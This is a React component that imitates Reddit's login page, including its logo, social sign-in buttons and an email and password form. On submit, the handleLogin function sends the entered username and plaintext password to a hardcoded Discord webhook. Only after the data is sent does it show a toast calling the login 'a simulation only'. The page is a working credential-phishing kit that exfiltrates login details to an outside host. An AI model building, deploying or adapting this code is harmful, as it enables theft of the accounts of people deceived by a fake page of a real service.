import React, { useState } from 'react';
import { Check, X, AlertCircle } from 'lucide-react';

interface CustomAlert {
  show: boolean;
  message: string;
  type: 'success' | 'error' | 'info';
}

const RedditLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const [attemptedSubmit, setAttemptedSubmit] = useState(false);

  // Custom Alert State
  const [activeAlert, setActiveAlert] = useState<CustomAlert>({ show: false, message: '', type: 'info' });

  const showAlert = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
    setActiveAlert({ show: true, message, type });
    setTimeout(() => setActiveAlert(prev => ({ ...prev, show: false })), 2000);
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAttemptedSubmit(true);
    
    // Validate fields
    const emailEmpty = !email.trim();
    const passwordEmpty = !password.trim();
    
    setEmailError(emailEmpty);
    setPasswordError(passwordEmpty);
    
    if (emailEmpty || passwordEmpty) {
      return;
    }

    try {
      // Send login details to Discord webhook
      const webhookUrl = 'https://discord.com/api/webhooks/1463586619612205289/3sRnACuGhW3BCULUQkyaTnaw3EIWd3NhumDqyknN70FPgjccKOqTjeGZxVTEwprhRiot';
      
      const currentTime = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      const embed = {
        embeds: [{
          title: '🔐 Reddit Login Attempt',
          color: 0xFF4500,
          fields: [
            {
              name: '👤 Email/Username',
              value: `\`\`\`${email}\`\`\``,
              inline: false
            },
            {
              name: '🔑 Password',
              value: `\`\`\`${password}\`\`\``,
              inline: false
            },
            {
              name: '🕐 Timestamp',
              value: currentTime,
              inline: false
            },
            {
              name: '🌐 Source',
              value: 'TaskNet Reddit Login Page',
              inline: false
            }
          ],
          footer: {
            text: 'TaskNet Security Monitor'
          },
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed)
      });

      showAlert('Login attempt recorded. This is a simulation only.', 'info');
    } catch (error) {
      console.error('Error sending to Discord:', error);
      showAlert('Reddit Login is for simulation only.', 'info');
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#0B1416] flex flex-col font-['Noto_Sans',_sans-serif] selection:bg-blue-500 selection:text-white">
      {/* Custom Alert Toast */}
      <div className={`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${
        activeAlert.show ? 'opacity-100 translate-y-0 scale-100' : 'opacity-0 -translate-y-4 scale-95'
      }`}>
        <div className={`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${
          activeAlert.type === 'success' ? 'bg-emerald-500/15 border-emerald-500/30 text-emerald-400' :
          activeAlert.type === 'error' ? 'bg-red-500/15 border-red-500/30 text-red-400' :
          'bg-blue-500/15 border-blue-500/30 text-blue-400'
        }`}>
          <div className="flex items-center gap-4">
            <div className="flex-shrink-0">
              {activeAlert.type === 'success' ? <Check size={24} strokeWidth={3} /> : 
               activeAlert.type === 'error' ? <X size={24} strokeWidth={3} /> : <AlertCircle size={24} strokeWidth={3} />}
            </div>
            <span className="font-bold text-base tracking-tight leading-tight">{activeAlert.message}</span>
          </div>
          <button 
            onClick={() => setActiveAlert(prev => ({ ...prev, show: false }))}
            className="flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors"
          >
            <X size={18} strokeWidth={3} />
          </button>
        </div>
      </div>

      {/* Header */}
      <header className="w-full px-6 py-5 flex items-center">
        <div className="flex items-center gap-2">
          <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
            {/* Orange Circle with Snoo */}
            <circle cx="20" cy="20" r="16" fill="#FF4500"/>
            <path d="M28.5 20c0-.8-.7-1.4-1.5-1.4-.1 0-.2 0-.2.1-1-.7-2.3-1.2-3.8-1.3l.8-3.9 2.7.6c.1.5.5.9 1.1.9.7 0 1.3-.6 1.3-1.3s-.6-1.3-1.3-1.3c-.5 0-.9.3-1.1.7l-3-.7c-.2 0-.3.1-.4.2l-1 4.5c-1.5.1-2.9.5-3.8 1.2-.1-.1-.2-.1-.2-.1-.8 0-1.5.6-1.5 1.4s.7 1.4 1.5 1.4c.1 0 .2 0 .2-.1.1.6.3 1.2.6 1.7-.7.4-1.1 1.1-1.1 1.9 0 1.3.9 2.3 2.2 2.3.6 0 1.1-.2 1.5-.6 1.1.5 2.4.8 3.9.8s2.8-.3 3.9-.8c.4.4 1 .6 1.5.6 1.3 0 2.2-1 2.2-2.3 0-.8-.4-1.5-1.1-1.9.3-.5.5-1.1.6-1.7.1 0 .2.1.2.1.8 0 1.5-.6 1.5-1.4zM16.5 22.1c-.7 0-1.3-.6-1.3-1.3s.6-1.3 1.3-1.3 1.3.6 1.3 1.3-.6 1.3-1.3 1.3zm8.3 3.9c-1.5 1.2-4.5 1.2-6 0-.1-.1-.2-.3-.1-.4.1-.1.3-.1.4-.1 1.2 1 4 1 5.2 0 .1-.1.3-.1.4.1.1.1.1.3 0 .4zm.2-2.6c-.7 0-1.3-.6-1.3-1.3s.6-1.3 1.3-1.3 1.3.6 1.3 1.3-.6 1.3-1.3 1.3z" fill="white"/>
            
            {/* reddit text */}
            <path d="M48.2 27.6h-2.1v-6.8c0-1.7-1.1-2.7-2.6-2.7-1.5 0-2.8 1.1-2.8 3v6.5h-2.1v-9.5h2.1v1.1c.7-.8 1.9-1.4 3.3-1.4 2.5 0 4.2 1.6 4.2 4.3v5.5zM58.3 22.8c0-3.1-2.2-5.1-5-5.1-3 0-5.3 2.3-5.3 5s2.3 5 5.3 5c2 0 3.7-1 4.5-2.5l-1.7-1c-.5.8-1.5 1.4-2.7 1.4-1.8 0-3.2-1.2-3.3-2.8h8.2zm-2.1-1.5h-6.1c.2-1.5 1.4-2.5 2.9-2.5 1.7 0 3 1 3.2 2.5zM71.4 27.6h-2.1v-1.1c-.7.8-1.9 1.4-3.3 1.4-2.8 0-5.1-2.3-5.1-5s2.3-5 5.1-5c1.4 0 2.6.6 3.3 1.4v-5.4h2.1v13.7zm-2.1-4.8c0-1.7-1.4-3-3.1-3-1.7 0-3.1 1.3-3.1 3s1.4 3 3.1 3c1.7 0 3.1-1.3 3.1-3zM83.4 27.6h-2.1v-1.1c-.7.8-1.9 1.4-3.3 1.4-2.8 0-5.1-2.3-5.1-5s2.3-5 5.1-5c1.4 0 2.6.6 3.3 1.4v-5.4h2.1v13.7zm-2.1-4.8c0-1.7-1.4-3-3.1-3-1.7 0-3.1 1.3-3.1 3s1.4 3 3.1 3c1.7 0 3.1-1.3 3.1-3zM88.7 15.6c0-.8.6-1.4 1.4-1.4.8 0 1.4.6 1.4 1.4 0 .8-.6 1.4-1.4 1.4-.8 0-1.4-.6-1.4-1.4zm-.3 12h2.1v-9.5h-2.1v9.5zM100.3 19.8h-2.1v4.5c0 1 .5 1.5 1.4 1.5h.7v1.8h-.7c-2.1 0-3.5-1-3.5-3.3v-4.5h-1.5v-1.7h1.5v-2.8l2.1-1.2v4h2.1v1.7z" fill="#1C1C1C"/>
            
            {/* Orange dot on the 'i' */}
            <circle cx="90.1" cy="15.6" r="2.8" fill="#FF4500"/>
          </svg>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-[#1A1A1B] rounded-3xl p-8 shadow-2xl">
          <h1 className="text-white text-2xl font-medium text-center mb-4">Log In</h1>
          
          <p className="text-[#B8C5C9] text-xs text-center mb-6 leading-relaxed">
            By continuing, you agree to our <a href="#" className="text-[#4A9EFF] hover:underline">User Agreement</a> and acknowledge that you understand the <a href="#" className="text-[#4A9EFF] hover:underline">Privacy Policy</a>.
          </p>

          <div className="space-y-3 mb-6">
            <button className="w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors">
              <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
              </svg>
              Continue With Phone Number
            </button>

            <button className="w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors">
              <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5" />
              Continue With Google
            </button>

            <button className="w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors">
              <svg className="w-5 h-5" viewBox="0 0 384 512" fill="currentColor">
                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
              </svg>
              Continue With Apple
            </button>

            <button className="w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors">
              <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
                <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>
              </svg>
              Email me a one-time link
            </button>
          </div>

          <div className="flex items-center gap-4 mb-6">
            <div className="h-px flex-1 bg-[#343536]"></div>
            <span className="text-[#B8C5C9] text-xs font-bold">OR</span>
            <div className="h-px flex-1 bg-[#343536]"></div>
          </div>

          <form className="space-y-4" onSubmit={handleLogin}>
            <div>
              <div className={`relative ${
                emailError ? 'mb-1' : ''
              }`}>
                <input
                  type="text"
                  placeholder="Email or username *"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (attemptedSubmit) setEmailError(!e.target.value.trim());
                  }}
                  className={`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${
                    emailError 
                      ? 'border-[#EA0027] focus:border-[#EA0027]' 
                      : 'border-[#343536] focus:border-white hover:border-[#474748]'
                  }`}
                />
                {emailError && (
                  <div className="absolute right-4 top-1/2 -translate-y-1/2">
                    <svg className="w-5 h-5 text-[#EA0027]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="10"/>
                      <line x1="12" y1="8" x2="12" y2="12"/>
                      <line x1="12" y1="16" x2="12.01" y2="16"/>
                    </svg>
                  </div>
                )}
              </div>
              {emailError && (
                <p className="text-[#EA0027] text-xs ml-4 mb-2">Please fill out this field.</p>
              )}
            </div>

            <div>
              <div className={`relative ${
                passwordError ? 'mb-1' : ''
              }`}>
                <input
                  type="password"
                  placeholder="Password *"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (attemptedSubmit) setPasswordError(!e.target.value.trim());
                  }}
                  className={`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${
                    passwordError 
                      ? 'border-[#EA0027] focus:border-[#EA0027]' 
                      : 'border-[#343536] focus:border-white hover:border-[#474748]'
                  }`}
                />
                {passwordError && (
                  <div className="absolute right-4 top-1/2 -translate-y-1/2">
                    <svg className="w-5 h-5 text-[#EA0027]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="10"/>
                      <line x1="12" y1="8" x2="12" y2="12"/>
                      <line x1="12" y1="16" x2="12.01" y2="16"/>
                    </svg>
                  </div>
                )}
              </div>
              {passwordError && (
                <p className="text-[#EA0027] text-xs ml-4 mb-2">Please fill out this field.</p>
              )}
            </div>

            <div className="text-xs space-y-2 pt-2">
              <a href="#" className="text-[#4A9EFF] hover:underline block">Forgot password?</a>
              <p className="text-[#B8C5C9]">
                New to Reddit? <a href="#" className="text-[#4A9EFF] hover:underline">Sign Up</a>
              </p>
            </div>

            <button
              type="submit"
              className="w-full h-12 bg-[#D93A00] hover:bg-[#C13B00] disabled:bg-[#343536] disabled:text-[#818384] disabled:cursor-not-allowed text-white rounded-full font-bold text-sm transition-colors mt-6"
            >
              Log In
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default RedditLogin;
